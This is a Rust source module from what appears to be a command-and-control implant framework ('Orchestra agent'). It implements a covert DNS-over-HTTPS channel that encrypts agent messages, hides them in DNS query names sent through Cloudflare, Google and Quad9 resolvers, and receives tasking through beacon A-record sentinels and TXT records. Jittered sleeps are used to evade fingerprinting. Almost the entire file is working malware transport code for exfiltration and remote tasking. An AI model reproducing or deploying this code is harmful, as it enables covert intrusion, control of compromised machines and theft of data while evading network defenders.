//! DNS-over-HTTPS (DoH) covert transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not wired into the default startup path
//!
//! This module implements a `Transport` that tunnels agent messages inside DNS
//! TXT queries sent to a DoH resolver (Cloudflare, Google, etc.).  The C2
//! server must run a corresponding DoH-aware listener to decode the TXT
//! payload.
//!
//! ## How to enable
//!
//! 1. Set `dns_over_https = true` and optionally `cdn_relay` in `agent.toml`.
//! 2. In `agent/src/lib.rs` `Agent::new()`, replace the default TLS transport
//!    with `c2_doh::DohTransport::new(&profile, &sleep_cfg, session).await?`.
//!
//! ## Limitations
//!
//! * Maximum payload per DNS TXT record is ~255 bytes; large messages are
//!   automatically fragmented and reassembled.
//! * DoH resolvers may rate-limit or cache queries; jitter from `SleepConfig`
//!   is applied between fragments to reduce fingerprinting.
//! * Server-side DoH listener is **not** included in this release.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use common::config::{MalleableProfile, SleepConfig};
use common::{CryptoSession, Message, Transport};
use rand::seq::SliceRandom;
use tokio::time::Duration;

const DOH_RESOLVERS: &[&str] = &[
    "https://cloudflare-dns.com/dns-query",
    "https://dns.google/resolve",
    "https://dns.quad9.net/dns-query",
];

pub struct DohTransport {
    profile: MalleableProfile,
    client: reqwest::Client,
    session: CryptoSession,
    session_id: u32,
    seq: u32,
    agent_id: String,
}

impl DohTransport {
    pub async fn new(profile: &MalleableProfile, session: CryptoSession, agent_id: String) -> Result<Self> {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            reqwest::header::HeaderValue::from_str(&profile.user_agent)?,
        );
        headers.insert(
            reqwest::header::ACCEPT,
            reqwest::header::HeaderValue::from_static("application/dns-json"),
        );

        let client = reqwest::Client::builder()
            .use_rustls_tls()
            .default_headers(headers)
            .build()?;

        Ok(Self {
            profile: profile.clone(),
            client,
            session,
            session_id: rand::random(),
            seq: 0,
            agent_id,
        })
    }

    fn select_resolver(&self) -> &str {
        DOH_RESOLVERS
            .choose(&mut rand::thread_rng())
            .unwrap_or(&DOH_RESOLVERS[0])
    }

    async fn execute_query(&self, domain: &str, qtype: &str) -> Result<serde_json::Value> {
        let resolver = self.select_resolver();
        let url = format!("{}?name={}&type={}", resolver, domain, qtype);

        let resp = self.client.get(&url).send().await?;
        let json: serde_json::Value = resp.json().await?;
        Ok(json)
    }
}

#[async_trait]
impl Transport for DohTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.session.encrypt(&serialized);

        let b32_data = base32::encode(base32::Alphabet::RFC4648 { padding: false }, &ciphertext);
        let chunks: Vec<&str> = b32_data
            .as_bytes()
            .chunks(63)
            .map(|c| std::str::from_utf8(c).unwrap())
            .collect();

        for chunk in chunks {
            self.seq = self.seq.wrapping_add(1);
            let domain = format!(
                "{}.{}.{:x}.{}",
                self.seq,
                chunk.to_ascii_lowercase(),
                self.session_id,
                self.profile.host_header
            );

            // Send chunk via TXT query
            let _ = self.execute_query(&domain, "TXT").await?;

            let sleep_dur =
                crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
            crate::memory_guard::guarded_sleep(
                Duration::from_millis(sleep_dur.as_millis() as u64 / 10),
                None,
            )
            .await?;
        }

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        // Beacon: A record query
        let beacon_domain = format!("beacon.{:x}.{}", self.session_id, self.profile.host_header);
        let json = self.execute_query(&beacon_domain, "A").await?;

        // Check for a magic "tasking available" signal in the A record answer.
        // A domain that always resolves (e.g., exists in DNS) will always have
        // an Answer field, so we must look for a *specific* sentinel IP address
        // to indicate that actual tasking is waiting.  The sentinel is
        // configurable per malleable profile; any other answer — including
        // legitimate CDN IPs — is treated as "no tasking".
        let has_tasking = json
            .get("Answer")
            .and_then(|a| a.as_array())
            .map(|arr| {
                arr.iter().any(|r| {
                    r.get("data")
                        .and_then(|d| d.as_str())
                        .map(|s| s.trim() == self.profile.doh_beacon_sentinel.as_str())
                        .unwrap_or(false)
                })
            })
            .unwrap_or(false);
        if !has_tasking {
            let sleep_dur =
                crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
            crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
            return Ok(Message::Heartbeat {
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                agent_id: self.agent_id.clone(),
                status: "idle".to_string(),
            });
        }

        // Fetch actual data via TXT record
        let task_domain = format!("task.{:x}.{}", self.session_id, self.profile.host_header);
        let txt_json = self.execute_query(&task_domain, "TXT").await?;

        let answer = txt_json
            .get("Answer")
            .and_then(|a| a.as_array())
            .ok_or(anyhow!("Invalid format"))?;
        let mut full_b32 = String::new();
        for record in answer {
            if let Some(data) = record.get("data").and_then(|d| d.as_str()) {
                full_b32.push_str(data.trim_matches('"'));
            }
        }

        let ciphertext = base32::decode(base32::Alphabet::RFC4648 { padding: false }, &full_b32)
            .ok_or(anyhow!("Base32 decode failed"))?;

        let plaintext = self.session.decrypt(&ciphertext)?;
        let msg = bincode::deserialize(&plaintext)?;

        Ok(msg)
    }
}
